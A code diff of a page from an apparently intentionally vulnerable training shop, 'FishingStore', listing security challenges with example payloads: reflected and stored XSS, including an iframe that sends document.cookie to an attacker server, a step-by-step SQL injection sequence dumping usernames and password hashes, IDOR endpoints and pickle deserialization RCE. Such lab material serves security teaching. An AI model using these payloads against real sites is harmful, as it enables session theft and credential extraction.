@@ -3,153 +3,116 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>FishingStore - Security Challenges</title>
+    <title>Change Password - FishingStore</title>
     <link rel="stylesheet" href="/css/style.css">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
-        .accordion {
-            margin-top: 2rem;
-        }
-        
-        .accordion-item {
-            background: #fff;
-            border: 1px solid #e0e0e0;
-            border-radius: 8px;
-            margin-bottom: 1rem;
-            overflow: hidden;
-            box-shadow: 0 2px 4px rgba(0,0,0,0.05);
-        }
-        
-        .accordion-header {
-            background: #f8f9fa;
-            padding: 0;
-            margin: 0;
-            cursor: pointer;
-            transition: background-color 0.3s ease;
-        }
-        
-        .accordion-header:hover {
-            background: #e9ecef;
-        }
-        
-        .accordion-button {
-            width: 100%;
-            padding: 1rem;
-            border: none;
-            background: none;
-            text-align: left;
-            font-size: 1.1rem;
-            font-weight: 600;
-            color: #333;
+        .profile-container {
+            max-width: 800px;
+            margin: 40px auto;
+            padding: 0 20px;
             display: flex;
+            flex-direction: column;
             align-items: center;
-            justify-content: flex-start;
-            cursor: pointer;
         }
-        
-        .accordion-button:after {
-            content: '\f078';
-            font-family: 'Font Awesome 6 Free';
-            font-weight: 900;
-            transition: transform 0.3s ease;
-            margin-left: auto;
-            padding-left: 1rem;
+
+        .profile-section {
+            background: white;
+            border-radius: 8px;
+            padding: 30px;
+            margin-bottom: 30px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+            width: 100%;
+            max-width: 600px;
         }
-        
-        .accordion-button[aria-expanded="true"]:after {
-            transform: rotate(180deg);
+
+        .profile-section h2 {
+            text-align: center;
+            margin: 0 0 20px 0;
+            color: #333;
+            font-size: 1.5em;
+            padding-bottom: 10px;
+            border-bottom: 2px solid #eee;
         }
-        
-        .accordion-content {
-            height: 0;
-            overflow: hidden;
-            transition: height 0.3s ease-out;
+
+        .profile-section h2 i {
+            margin-right: 10px;
+            color: #4CAF50;
         }
-        
-        .accordion-content.active {
-            height: auto;
+
+        .form-group {
+            margin-bottom: 20px;
         }
-        
-        .accordion-body {
-            padding: 1rem;
-            border-top: 1px solid #e0e0e0;
-            text-align: left;
+
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            color: #333;
+            font-weight: 500;
         }
-        
-        .challenge-badge {
-            display: inline-block;
-            padding: 0.25rem 0.5rem;
+
+        .form-group input {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ddd;
             border-radius: 4px;
-            font-size: 0.875rem;
-            font-weight: 600;
-            margin-left: 1rem;
+            font-size: 1em;
+            transition: border-color 0.2s;
         }
-        
-        .difficulty-easy {
+
+        .form-group input:focus {
+            border-color: #4CAF50;
+            outline: none;
+            box-shadow: 0 0 0 2px rgba(76, 175, 80, 0.1);
+        }
+
+        .btn-save {
+            display: block;
+            width: 100%;
+            max-width: 200px;
+            margin: 30px auto 0;
+            padding: 12px 24px;
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 1em;
+            transition: all 0.2s;
+        }
+
+        .btn-save:hover {
+            background-color: #45a049;
+            transform: translateY(-2px);
+        }
+
+        .alert {
+            text-align: center;
+            width: 100%;
+            max-width: 400px;
+            margin: 0 auto 20px;
+            padding: 12px;
+            border-radius: 4px;
+            display: none;
+        }
+
+        .alert-success {
             background-color: #d4edda;
             color: #155724;
+            border: 1px solid #c3e6cb;
         }
-        
-        .difficulty-medium {
-            background-color: #fff3cd;
-            color: #856404;
-        }
-        
-        .difficulty-hard {
+
+        .alert-error {
             background-color: #f8d7da;
             color: #721c24;
-        }
-
-        .code-block {
-            background: #f8f9fa;
-            border: 1px solid #e0e0e0;
-            border-radius: 4px;
-            padding: 1rem;
-            margin: 1rem 0;
-            font-family: monospace;
-            white-space: pre-wrap;
-            text-align: left;
-        }
-
-        .steps-list {
-            padding-left: 1.2rem;
-            text-align: left;
-        }
-
-        .steps-list li {
-            margin-bottom: 0.5rem;
-        }
-
-        .challenge-icon {
-            margin-right: 0.5rem;
-            width: 24px;
-            text-align: center;
-        }
-
-        h4 {
-            text-align: left;
-            margin-top: 1.5rem;
-            margin-bottom: 1rem;
-        }
-
-        p {
-            text-align: left;
-            margin-bottom: 1rem;
-        }
-
-        .alert p {
-            margin-bottom: 0;
+            border: 1px solid #f5c6cb;
         }
     </style>
 </head>
-<body class="bg-light">
+<body>
     <nav class="navbar">
         <div class="nav-container">
             <a href="/" class="nav-brand">FishingStore</a>
-            <div class="search-bar">
-                <input type="text" id="searchInput" placeholder="Search for fishing gear...">
-                <button id="searchButton"><i class="fas fa-search"></i></button>
-            </div>
             <div class="nav-menu">
                 <a href="/cart.html" class="cart-icon" id="cartIcon">
                     <i class="fas fa-shopping-cart"></i>
@@ -184,203 +147,89 @@
         </div>
     </nav>
 
-    <div class="container mt-5 challenge-page">
-        <div class="alert alert-warning">
-            <h4 class="alert-heading">⚠️ Aviso de Segurança</h4>
-            <p class="mb-0">Esta aplicação foi desenvolvida intencionalmente com vulnerabilidades para fins educacionais. 
-            NÃO use em produção ou exponha publicamente.</p>
+    <div class="profile-container auth-only">
+        <div class="profile-section">
+            <h2><i class="fas fa-flag"></i> Challenges</h2>
+<!-- Substitua dentro de .profile-section -->
+<p class="lead mb-4" style="text-align:center;">Explore as vulnerabilidades intencionais desta aplicação:</p>
+
+<ul style="list-style:none; padding:0; max-width:600px; margin:0 auto;">
+    <li style="background:#f8f9fa; border-radius:8px; margin-bottom:20px; padding:20px 24px; border:1px solid #eee;">
+        <h3 style="margin-top:0;"><i class="fas fa-code challenge-icon"></i> XSS Reflected <span class="challenge-badge difficulty-medium"></span></h3>
+        <p><b>Goal:</b> Exploit reflected XSS in http://your-server/index.html?affiliate=super-sports-tv.</p>
+        <b>Steps:</b>
+        <ol>
+            <li>1. You must be unlogged in</li>
+            <li>2. Open the link in a new tab http://your-server/index.html?affiliate=super-sports-tv.</li>
+        </ol>
+        <b>Example Payload:</b>
+        <div class="code-block">http://your-server/index.html?affiliate=super-sports-tv&lt;script&gt;alert(1)&lt;/script&gt;</div>
+    </li>
+    <li style="background:#f8f9fa; border-radius:8px; margin-bottom:20px; padding:20px 24px; border:1px solid #eee;">
+        <h3 style="margin-top:0;"><i class="fas fa-code challenge-icon"></i> XSS Stored <span class="challenge-badge difficulty-medium"></span></h3>
+        <p><b>Goal:</b> Exploit stored XSS in comments to steal other users' cookies.</p>
+        <b>Steps:</b>
+        <ol>
+            <li>Create a comment with an XSS payload</li>
+            <li>Use an iframe to bypass restrictions</li>
+            <li>Capture cookies on your server</li>
+        </ol>
+        <b>Example Payload:</b>
+        <div class="code-block">&lt;iframe src="javascript:fetch('http://your-server/'+document.cookie)"&gt;&lt;/iframe&gt;</div>
+    </li>
+    <li style="background:#f8f9fa; border-radius:8px; margin-bottom:20px; padding:20px 24px; border:1px solid #eee;">
+        <h3 style="margin-top:0;"><i class="fas fa-user-secret challenge-icon"></i> IDOR in Addresses <span class="challenge-badge difficulty-medium"></span></h3>
+        <p><b>Goal:</b> Exploit IDOR to access and modify other users' addresses.</p>
+        <b>Steps:</b>
+        <ol>
+            <li>Identify your user ID</li>
+            <li>Modify the ID in the request</li>
+            <li>Access/modify other users' data</li>
+        </ol>
+        <b>Vulnerable Endpoints:</b>
+        <div class="code-block">GET /api/user/{user_id}/address<br>PUT /api/user/{user_id}/address</div>
+    </li>
+    <li style="background:#f8f9fa; border-radius:8px; margin-bottom:20px; padding:20px 24px; border:1px solid #eee;">
+        <h3 style="margin-top:0;"><i class="fas fa-database challenge-icon"></i> SQL Injection in Search <span class="challenge-badge difficulty-easy"></span></h3>
+        <p><b>Goal:</b> Exploit SQL Injection vulnerability in the search endpoint to extract sensitive information.</p>
+        <b>Steps:</b>
+        <ol>
+            <li>Use ORDER BY to discover the number of columns</li>
+            <li>Use UNION SELECT to map the columns</li>
+            <li>Extract information from the sqlite_master table</li>
+            <li>Extract user credentials</li>
+        </ol>
+        <b>Example Payload:</b>
+        <div class="code-block">'</div>
+        <div class="code-block">'--</div>
+        <div class="code-block">' ORDER BY 1----</div>
+        <div class="code-block">' ORDER BY 6--</div>
+        <div class="code-block">' ORDER BY 5--</div>
+        <div class="code-block">A' UNION SELECT 1,2,3,4,5--</div>
+        <div class="code-block">A' UNION SELECT name, sql, 3,4,5 FROM sqlite_master--</div>
+        <div class="code-block">A' UNION SELECT name, sql, 3,4,5 FROM sqlite_master WHERE type='table'--</div>
+        <div class="code-block">A' UNION SELECT 1, username, hashed_password,4,5 FROM users--</div>
+
+
+    </li>
+    <li style="background:#f8f9fa; border-radius:8px; margin-bottom:20px; padding:20px 24px; border:1px solid #eee;">
+        <h3 style="margin-top:0;"><i class="fas fa-terminal challenge-icon"></i> RCE via Pickle in Cart Backup <span class="challenge-badge difficulty-hard"></span></h3>
+        <p><b>Goal:</b> Exploit insecure deserialization vulnerability in cart backup to execute arbitrary code.</p>
+        <b>Steps:</b>
+        <ol>
+            <li>Create a malicious class implementing __reduce__</li>
+            <li>Serialize the class with pickle</li>
+            <li>Encode in base64</li>
+            <li>Send to the import endpoint</li>
+        </ol>
+        <b>Vulnerable Endpoints:</b>
+        <div class="code-block">GET /api/cart/export<br>POST /api/cart/import</div>
+        <b>Exploit Script:</b>
+        <div class="code-block">python3 exploit.py<br>1. Export current cart<br>2. Import malicious cart (with RCE)<br>3. Test basic RCE (whoami)</div>
+    </li>
+</ul>
         </div>
 
-        <h2 class="mb-4">Desafios de Segurança</h2>
-        <p class="lead mb-4">Explore as vulnerabilidades intencionalmente implementadas nesta aplicação:</p>
+        
 
-        <div class="accordion">
-            <!-- SQL Injection Challenge -->
-            <div class="accordion-item">
-                <h3 class="accordion-header">
-                    <button class="accordion-button" aria-expanded="false">
-                        <i class="fas fa-database challenge-icon"></i>
-                        SQL Injection na Busca
-                        <span class="challenge-badge difficulty-easy">Fácil</span>
-                    </button>
-                </h3>
-                <div class="accordion-content">
-                    <div class="accordion-body">
-                        <h4>Objetivo</h4>
-                        <p>Explorar a vulnerabilidade de SQL Injection no endpoint de busca para extrair informações sensíveis.</p>
-
-                        <h4>Passos</h4>
-                        <ol class="steps-list">
-                            <li>Use ORDER BY para descobrir o número de colunas</li>
-                            <li>Use UNION SELECT para mapear as colunas</li>
-                            <li>Extraia informações da tabela sqlite_master</li>
-                            <li>Extraia credenciais de usuários</li>
-                        </ol>
-
-                        <h4>Exemplo de Payload</h4>
-                        <div class="code-block">' UNION SELECT 1,2,3,4,5--</div>
-                    </div>
-                </div>
-            </div>
-
-            <!-- XSS Challenge -->
-            <div class="accordion-item">
-                <h3 class="accordion-header">
-                    <button class="accordion-button" aria-expanded="false">
-                        <i class="fas fa-code challenge-icon"></i>
-                        XSS nos Comentários
-                        <span class="challenge-badge difficulty-medium">Médio</span>
-                    </button>
-                </h3>
-                <div class="accordion-content">
-                    <div class="accordion-body">
-                        <h4>Objetivo</h4>
-                        <p>Explorar XSS armazenado nos comentários para roubar cookies de outros usuários.</p>
-
-                        <h4>Passos</h4>
-                        <ol class="steps-list">
-                            <li>Crie um comentário com payload XSS</li>
-                            <li>Use um iframe para contornar restrições</li>
-                            <li>Capture cookies em seu servidor</li>
-                        </ol>
-
-                        <h4>Exemplo de Payload</h4>
-                        <div class="code-block">&lt;iframe src="javascript:fetch('http://seu-servidor/'+document.cookie)"&gt;&lt;/iframe&gt;</div>
-                    </div>
-                </div>
-            </div>
-
-            <!-- IDOR Challenge -->
-            <div class="accordion-item">
-                <h3 class="accordion-header">
-                    <button class="accordion-button" aria-expanded="false">
-                        <i class="fas fa-user-secret challenge-icon"></i>
-                        IDOR nos Endereços
-                        <span class="challenge-badge difficulty-medium">Médio</span>
-                    </button>
-                </h3>
-                <div class="accordion-content">
-                    <div class="accordion-body">
-                        <h4>Objetivo</h4>
-                        <p>Explorar IDOR para acessar e modificar endereços de outros usuários.</p>
-
-                        <h4>Passos</h4>
-                        <ol class="steps-list">
-                            <li>Identifique seu ID de usuário</li>
-                            <li>Modifique o ID na requisição</li>
-                            <li>Acesse/modifique dados de outros usuários</li>
-                        </ol>
-
-                        <h4>Endpoints Vulneráveis</h4>
-                        <div class="code-block">GET /api/user/{user_id}/address
-PUT /api/user/{user_id}/address</div>
-                    </div>
-                </div>
-            </div>
-
-            <!-- RCE Challenge -->
-            <div class="accordion-item">
-                <h3 class="accordion-header">
-                    <button class="accordion-button" aria-expanded="false">
-                        <i class="fas fa-terminal challenge-icon"></i>
-                        RCE via Pickle no Backup do Carrinho
-                        <span class="challenge-badge difficulty-hard">Difícil</span>
-                    </button>
-                </h3>
-                <div class="accordion-content">
-                    <div class="accordion-body">
-                        <h4>Objetivo</h4>
-                        <p>Explorar a vulnerabilidade de desserialização insegura no backup do carrinho para executar código arbitrário.</p>
-
-                        <h4>Passos</h4>
-                        <ol class="steps-list">
-                            <li>Crie uma classe maliciosa que implementa __reduce__</li>
-                            <li>Serialize a classe com pickle</li>
-                            <li>Codifique em base64</li>
-                            <li>Envie para o endpoint de importação</li>
-                        </ol>
-
-                        <h4>Endpoints Vulneráveis</h4>
-                        <div class="code-block">GET /api/cart/export
-POST /api/cart/import</div>
-
-                        <h4>Script de Exploit</h4>
-                        <p>Use o script <code>exploit.py</code> fornecido para testar diferentes payloads:</p>
-                        <div class="code-block">python3 exploit.py
-1. Exportar carrinho atual
-2. Importar carrinho malicioso (com RCE)
-3. Testar RCE básico (whoami)</div>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </div>
-
-    <script src="/js/auth.js"></script>
-    <script>
-        // Verifica autenticação
-        checkAuth();
-
-        // Accordion functionality
-        document.querySelectorAll('.accordion-button').forEach(button => {
-            button.addEventListener('click', () => {
-                const content = button.parentElement.nextElementSibling;
-                const isExpanded = button.getAttribute('aria-expanded') === 'true';
-                
-                // Close all other accordion items
-                document.querySelectorAll('.accordion-content').forEach(item => {
-                    if (item !== content) {
-                        const itemButton = item.previousElementSibling.querySelector('.accordion-button');
-                        itemButton.setAttribute('aria-expanded', 'false');
-                        item.style.height = '0px';
-                    }
-                });
-                
-                // Toggle current accordion item
-                if (!isExpanded) {
-                    button.setAttribute('aria-expanded', 'true');
-                    content.style.height = content.scrollHeight + 'px';
-                } else {
-                    button.setAttribute('aria-expanded', 'false');
-                    content.style.height = '0px';
-                }
-            });
-        });
-
-        // Initialize accordion items with zero height
-        document.querySelectorAll('.accordion-content').forEach(content => {
-            content.style.height = '0px';
-        });
-
-        // User menu toggle
-        const userMenuBtn = document.getElementById('userMenuBtn');
-        const userMenuContent = document.getElementById('userMenuContent');
-
-        userMenuBtn.addEventListener('click', () => {
-            userMenuContent.classList.toggle('show');
-        });
-
-        document.addEventListener('click', (e) => {
-            if (!userMenuBtn.contains(e.target) && !userMenuContent.contains(e.target)) {
-                userMenuContent.classList.remove('show');
-            }
-        });
-
-        // Load cart count
-        async function loadCartCount() {
-            try {
-                const response = await fetch('/api/cart/count');
-                if (!response.ok) throw new Error('Failed to fetch cart count');
-                
-                const result = await response.json();
-                document.querySelector('.cart-count').textContent = result.count;
-            } catch (error) {
-                console.error('Error loading cart count:', error);
-            }
-        }
-
-        // Initialize
-        loadCartCount();
-    </script>
-</body>
-</html> 
+          
